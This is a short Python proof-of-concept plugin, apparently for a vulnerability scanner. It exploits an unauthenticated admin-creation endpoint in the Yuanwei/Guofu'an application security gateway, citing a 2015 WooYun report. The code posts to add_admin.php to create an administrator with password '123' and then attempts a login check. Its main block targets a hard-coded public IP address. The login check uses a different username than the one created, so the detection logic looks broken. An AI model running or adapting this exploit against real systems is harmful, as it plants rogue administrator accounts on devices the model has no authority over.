#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 远为应用安全网关(&国富安应用安全网关)任意添加管理员
refer: http://www.wooyun.org/bugs/wooyun-2015-0130878
description:
    好像所有文件都能未授权访问...
    以添加管理员为例
'''

import re
import random

def assign(service, arg):
    if service == 'yuanwei_gateway':
        return True, arg

def audit(arg):
    add_url = arg + 'adminconfig/admin/add_admin.php'
    username = 'testvul_'+ str(random.randint(111,999))
    post = 'user_name='+username+'&strname=&passwd=123&passwd2=123&user_desc=testvul'
    code, head, res, err, _ = curl.curl2(add_url, post=post)
    if (code != 200) and (code != 302):
        return False
    #登录测试
    login_url = arg + 'post_dl.php'
    post = 'name={username}&passwd=123'.format(username='admin_test')
    header = 'Content-Type: application/x-www-form-urlencoded'
    code, head, res, err, _ = curl.curl2(login_url, post=post, header=header)
    #print '++'+res+'++'
    if (code == 200) and (res == '\r\n' or res == '\n' or res == ''):
        security_hole('任意添加管理员：' + add_url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yuanwei_gateway','http://222.170.47.230:8888/')[1])